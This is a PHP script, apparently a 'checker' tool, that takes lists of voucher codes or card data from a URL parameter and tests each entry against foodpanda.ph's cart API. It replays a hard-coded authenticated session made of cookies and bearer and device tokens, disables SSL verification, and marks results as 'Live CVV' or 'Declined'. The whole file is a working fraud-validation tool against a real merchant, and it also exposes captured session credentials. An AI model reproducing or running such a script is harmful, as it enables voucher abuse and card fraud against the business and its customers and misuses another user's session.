<?php

error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('Asia/Bangkok');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$voucher = multiexplode(array(":", "|", ""), $lista)[0];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}

////////////////////////////===[For Authorizing Cards]

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.foodpanda.ph/cart/calculateAPI');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.foodpanda.ph',
'cookie: __cfduid=d486d5b0f04b4c33995f33df718bbfeda1611668517; hl=en; dhhPerseusGuestId=1611668518.4940270426.GkSPn5WD7W; dhhPerseusSessionId=1611668518.5771312915.iLb6lL7Ku; AppVersion=0c462a3; ld_key=110.54.186.61; __cf_bm=4d27743b8d6d22d923e6d13e61ca48c8dfe097c4-1611668518-1800-ATuilQ8LNg0Lmwn2SGpN1b+dil3cUz9NRECFcdwQxB09dQ0hdEY2KA0sQFNpO+8U902ugDlFze3QniuIKPgEPSk=; _pxhd=0770ef09db81b58a685768ff3eb16f673ca0ba4161e75849cbd0b401cb59a8a8:a1d13ba1-5fdc-11eb-8f9d-b3f20b8eaafc; token=eyJhbGciOiJSUzI1NiIsImtpZCI6InZvbG8iLCJ0eXAiOiJKV1QifQ.eyJpZCI6Im9ydWFua2pmcXFheGNsenRwbGdjMHluYmZhc3ZzZ2hvZThneXA4bjciLCJjbGllbnRfaWQiOiJ2b2xvIiwidXNlcl9pZCI6InBoeHBidHNpIiwiZXhwaXJlcyI6MTY0MzIwNDczNiwidG9rZW5fdHlwZSI6ImJlYXJlciIsInNjb3BlIjoiQVBJX0NVU1RPTUVSIEFQSV9SRUdJU1RFUkVEX0NVU1RPTUVSIn0.rDCqf1XBKTm-baE4m-twQa234PJpGyEuTCKRrvXP0bSo-5s4txRCN_d3rr4tDD5cjADqON6EEFihNszhwGuBl47vLBJ7PJfDzANinKMpgpPuMocTpExadILgdBIeYD9BfdVGOp0-cXBPfxHf9DEhpW_5X-j2UucWaR7-6EcI6yXfZrxetLqTYoviAwpdJeOC1BmHLloSHTk3lM1D4EXbK0mb1MHbDCC0psZk6JHv_DR3zggnWSM58J5h0Ys2A8am4LbpUgfFPu-YHbdHngrufPURHqkxaf3hQEQCuArjDERrjT-Fxc7v3Szb1twjwe5JBHCWl_hPRiJe7R8DzVgpZA; userSource=volo; device_token=eyJhbGciOiJSUzI1NiIsImtpZCI6InZvbG8iLCJ0eXAiOiJKV1QifQ.eyJpZCI6ImM4MGEwZDM3LTBjOGItNGZkZC04YWM3LWYxMDZkMDNjNWIxNiIsImNsaWVudF9pZCI6InZvbG8iLCJ1c2VyX2lkIjoicGh4cGJ0c2kiLCJleHBpcmVzIjo0NzY1MjY4NzM2LCJ0b2tlbl90eXBlIjoiYmVhcmVyIiwic2NvcGUiOiJERVZJQ0VfVE9LRU4ifQ.LxFgnt3WC3-C54QGMlGnKx5fVRU9dqbX_kDuo6cz8eTOz5G8oQwsv4KJUZXOkWN0V2hdfBUBTfgGvcIQ6aYyc0dc5B42lPwt-WtVHTTXt154RFFx9HWHBMtBkWr1BdbVfrOBI5uytLNhGaKjyQdJqlb6VGo2l4U0OkCuLu92bNo245t7IaQpJD3nqbkkacBG9EYp8kA3y05uZ9kOjQaxEAZqbUbuoVah96ZAQiZAdqIzxHbK7hQoYHxKe0Sfj_dlebMXpHKOu3_3aiLJNxKRdw9Y1RM4twtItqTOQrPkD_HY6A4JyUJC3hR5dELdtGwQGxTU6YBw4K6RB5MZWbZuZA; dhProviderTracked=true; dps-session-id=10.2875953_123.8669711_1611668518.4940270426.GkSPn5WD7W_1611668761_1611670561; PHPSESSID=088ccd383ea7fd21ddc10e4d221a16cf; dhhPerseusHitId=1611668860845.28952138010404748.li5mryory9',
'dps-session-id: eyJzZXNzaW9uX2lkIjoiMGUzODFmMjE5NDM0ZmZmNjcxMWI2ZmFiNTA3MTAzOWEiLCJwZXJzZXVzX2lkIjoiMTYxMTY2ODUxOC40OTQwMjcwNDI2LkdrU1BuNVdEN1ciLCJ0aW1lc3RhbXAiOjE2MTE2Njg3NjF9',
'User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36',
'Content-Type: application/json;charset=UTF-8',
'Origin: https://www.foodpanda.ph',
'Referer: https://www.foodpanda.ph/checkout/q9el/payment?expedition_type=delivery',
'Connection: keep-alive',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
    ));
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"payload":{"auto_apply_voucher":false,"expedition":{"type":"delivery","latitude":10.2875953,"longitude":123.8669711,"rider_tip":{"type":"amount","amount":0}},"order_time":"2021-01-26T21:52:13+08:00","products":[{"price":439,"id":11297369,"original_price":439,"quantity":1,"special_instructions":"","toppings":[{"optionsVisible":false,"quantity_minimum":null,"quantity_maximum":null,"selectedOptions":[],"is_available":true,"required":false,"id":26396854,"name":"Original","price":0,"original_price":0,"type":"full","options":[]}],"variation_id":13388633,"variation_name":"6 - pc. Chickenjoy - Solo","sold_out_option":"REFUND","vat_percentage":null,"menu_id":34127,"menu_category_id":494951,"packaging_charge":0,"code":"7de4cc01-17fd-4ab5-bfef-2b3363c6b4ab","menu_category_code":"492819","variation_code":"c0e07b06-a47a-4b7d-8590-7f4d36c251d5"}],"vendor":{"code":"q9el","latitude":10.295432,"longitude":123.869597,"marketplace":false,"vertical":"restaurants"},"dynamic_pricing":0,"payment":{"type_id":1,"methods":[{"method":"payment_on_delivery","amount":488}],"method":"payment_on_delivery"},"voucher":"'.$voucher.'"},"include":["expedition","timepicker"]}');

$result = curl_exec($ch);
$message = trim(strip_tags(getStr($result,'"message":"','"'))); 

//echo $result;
////////////////////////////===[Card Response]
$message = trim(strip_tags(getstr($result,'"message":"','"')));
$api_dead = "API DEAD";
//echo $message;

$msg_end = '';
$message_app = '<span class="badge badge-success">Live CVV</span>  '.$lista.'  <b>'.$message.'</b>';
//$message_app2 = '<span class="badge badge-success">Live CNN</span> '.$lista.' <b>'.$message.'</b>';
$message_dec = '<small>" '.$lista.' "  '.$message.'</small>';
$message_dead_api = '<span class="badge badge-danger">Declined</span>  '.$lista.'  <b>'.$api_dead.'</b>';



if(strpos($result, 'CVV2 MATCHED') !== false) {
  echo '<b>#LIVE: </b>  '.$lista.'  <b>'.$bin.'</b>';
} elseif(strpos($result, 'CVV2 DECLINED') !== false) {
  echo $message_dec;
} elseif(strpos($result, 'LIVE') !== false) {
  echo $message_app;
} elseif(strpos($result, 'MISSING') !== false) {
  echo $message_dead_api; 
}
  else {
  echo $message_dec;
}
